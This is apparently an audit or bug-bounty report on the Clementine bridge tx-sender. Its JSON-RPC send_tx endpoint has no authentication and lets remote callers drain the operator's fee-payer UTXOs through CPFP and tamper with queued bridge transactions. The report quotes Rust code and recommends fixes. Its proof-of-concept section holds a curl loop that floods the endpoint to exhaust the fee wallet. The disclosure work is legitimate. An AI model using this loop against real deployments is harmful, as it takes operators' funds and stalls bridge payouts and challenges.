### Title
Unauthenticated tx-sender JSON-RPC `send_tx` endpoint allows any network peer to drain fee-payer UTXOs and suppress bridge transactions - (`File: crates/clementine-tx-sender/src/jsonrpc/server.rs`)

### Summary
The tx-sender standalone JSON-RPC server exposes `send_tx` and `send_citrea_tx` with zero authentication. When bound to `0.0.0.0` (an explicitly supported and documented configuration), any network-reachable attacker can submit arbitrary transactions with `FeePayingType::CPFP`, causing the tx-sender to spend its own fee-payer UTXOs to pay fees for the attacker's transactions. This drains the tx-sender-managed balances required for legitimate bridge operations (payout, challenge, reimbursement), causing liveness failure. The attacker can also manipulate the `cancel_outpoints`/`cancel_txids`/`activate_txids` fields to interfere with the tx-sender's state machine for queued bridge transactions.

### Finding Description

`start_jsonrpc_server` in `crates/clementine-tx-sender/src/jsonrpc/server.rs` builds a plain HTTP `jsonrpsee` server with no authentication layer:

```rust
let server: Server = ServerBuilder::default()
    .max_request_body_size(MAX_JSONRPC_REQUEST_BODY_SIZE)
    .build(bind_addr)
    .await
    ...
``` [1](#0-0) 

The `send_tx` handler accepts a fully attacker-controlled `InsertTryToSendParams` — including `signed_tx_hex`, `fee_paying_type`, `rbf_signing_info`, `cancel_outpoints`, `cancel_txids`, `activate_txids`, and `activate_outpoints` — and passes them directly to `TxSenderClient::insert_try_to_send` with no caller identity check: [2](#0-1) 

The configuration explicitly permits binding to `0.0.0.0`:

```rust
if bind != "127.0.0.1" && bind != "0.0.0.0" {
    return Err(...)
}
``` [3](#0-2) 

This is in direct contrast to the gRPC layer, which enforces mTLS with certificate pinning (`OnlyAggregatorAndSelf`) when `client_verification = true`: [4](#0-3) 

The tx-sender's own signing key and fee-payer UTXOs are used to create CPFP child transactions for any queued parent. The `TxSenderClient::insert_try_to_send` function stores the submitted transaction and its dependency metadata unconditionally: [5](#0-4) 

### Impact Explanation

**Fee-payer UTXO drain (direct fund loss):** An attacker submits many valid transactions (spending their own UTXOs) with `fee_paying_type = CPFP`. The tx-sender broadcasts each parent and creates a child transaction spending from its own fee-payer UTXOs to pay fees for the package. The attacker's transactions get confirmed at the operator's expense. The tx-sender-managed fee-payer balance is depleted.

**Bridge liveness failure:** Once fee-payer UTXOs are exhausted, the tx-sender cannot fee-bump legitimate bridge transactions — payout, challenge, reimbursement, and round transactions — causing them to remain unconfirmed. This breaks the bridge's safety/liveness guarantees: operators cannot claim reimbursement, watchtowers cannot challenge malicious kickoffs, and the challenge-response game stalls.

**Queue state manipulation:** The attacker can supply arbitrary `cancel_txids` and `activate_txids` to interfere with the activation/cancellation state machine for any queued bridge transaction ID they can enumerate (sequential `u32` IDs).

### Likelihood Explanation

The `0.0.0.0` bind address is explicitly documented and supported. In Docker/container deployments — the primary production deployment model shown in `scripts/docker/` — services commonly bind to `0.0.0.0` for inter-container communication. If the tx-sender port is reachable from outside the trusted network (misconfigured firewall, cloud security group, or shared network), the attack requires only a plain HTTP POST with no credentials. No privileged key material is needed. [6](#0-5) 

### Recommendation

1. **Add authentication to the JSON-RPC server.** Implement a shared-secret bearer token (checked via HTTP `Authorization` header) or restrict connections to a Unix domain socket (which inherits OS filesystem permissions). The gRPC layer's mTLS model should be mirrored here.

2. **Validate caller identity before accepting `send_tx`.** At minimum, bind-address restriction to `127.0.0.1` should be enforced by default and `0.0.0.0` should require explicit opt-in with a documented warning that no authentication is present.

3. **Rate-limit and cap queue insertions per source IP** to limit the blast radius of a CPFP drain attack even if the server is exposed.

### Proof of Concept

Attacker preconditions: tx-sender running with `TX_SENDER_JSONRPC_BIND=0.0.0.0`, port reachable from attacker's host. No credentials required.

```bash
# 1. Create a valid signed transaction spending attacker-controlled UTXOs
RAW_TX_HEX="<attacker-signed-tx-hex>"

# 2. Submit to tx-sender JSON-RPC with CPFP fee payment
# Repeat N times to drain fee-payer UTXOs
for i in $(seq 1 1000); do
  curl -s -H 'content-type: application/json' \
    --data "{
      \"jsonrpc\":\"2.0\",\"id\":$i,\"method\":\"send_tx\",
      \"params\":[{
        \"tx_metadata\": null,
        \"signed_tx_hex\": \"$RAW_TX_HEX\",
        \"fee_paying_type\": \"CPFP\",
        \"rbf_signing_info\": null,
        \"cancel_outpoints\": [],
        \"cancel_txids\": [],
        \"activate_txids\": [],
        \"activate_outpoints\": []
      }]
    }" http://<target>:3030
done

# Result: tx-sender creates 1000 CPFP child transactions spending its own
# fee-payer UTXOs. Fee-payer wallet is drained. Subsequent legitimate bridge
# transactions (payout, challenge, reimbursement) cannot be fee-bumped and
# remain unconfirmed indefinitely.
```

The duplicate-txid deduplication check (`check_if_tx_exists_on_txsender`) only deduplicates by txid, so the attacker can submit distinct transactions (different outputs/amounts) to bypass it. [7](#0-6)

        .register_async_method("send_tx", |params, client, _| async move {
            let req: InsertTryToSendParams = params.one().map_err(jsonrpc_err)?;

            let raw_tx = hex::decode(&req.signed_tx_hex).map_err(jsonrpc_err)?;
            let signed_tx: Transaction = consensus::deserialize(&raw_tx).map_err(jsonrpc_err)?;

            let mut dbtx = client.db.begin_transaction().await.map_err(jsonrpc_err)?;

            let try_to_send_id = client
                .insert_try_to_send(
                    &mut dbtx,
                    req.tx_metadata,
                    &signed_tx,
                    req.fee_paying_type,
                    req.rbf_signing_info,
                    &req.cancel_outpoints,
                    &req.cancel_txids,
                    &req.activate_txids,
                    &req.activate_outpoints,
                )
                .await
                .map_err(jsonrpc_err)?;

            client
                .db
                .commit_transaction(dbtx)
                .await
                .map_err(jsonrpc_err)?;

            Ok::<u32, ErrorObjectOwned>(try_to_send_id)
        })

```rust
    pub async fn insert_try_to_send(
        &self,
        dbtx: &mut crate::TxSenderTransaction,
        tx_metadata: Option<TxMetadata>,
        signed_tx: &Transaction,
        fee_paying_type: FeePayingType,
        rbf_signing_info: Option<RbfSigningInfo>,
        cancel_outpoints: &[OutPoint],
        cancel_txids: &[Txid],
        activate_txids: &[ActivatedWithTxid],
        activate_outpoints: &[ActivatedWithOutpoint],
    ) -> Result<u32, BridgeError> {
        let txid = signed_tx.compute_txid();

        // do not add duplicate transactions to the txsender
        let tx_exists = self
            .db
            .check_if_tx_exists_on_txsender(Some(dbtx), txid)
            .await?;
        if let Some(try_to_send_id) = tx_exists {
            return Ok(try_to_send_id);
        }

        tracing::info!(
            "Added tx {} with txid {} to the queue",
            tx_metadata
                .as_ref()
                .map(|data| format!("{:?}", data.tx_type))
                .unwrap_or("N/A".to_string()),
            txid
        );

        let try_to_send_id = self
            .db
            .save_tx(
                dbtx,
                tx_metadata,
                signed_tx,
                fee_paying_type,
                txid,
                rbf_signing_info,
            )
            .await?;
```
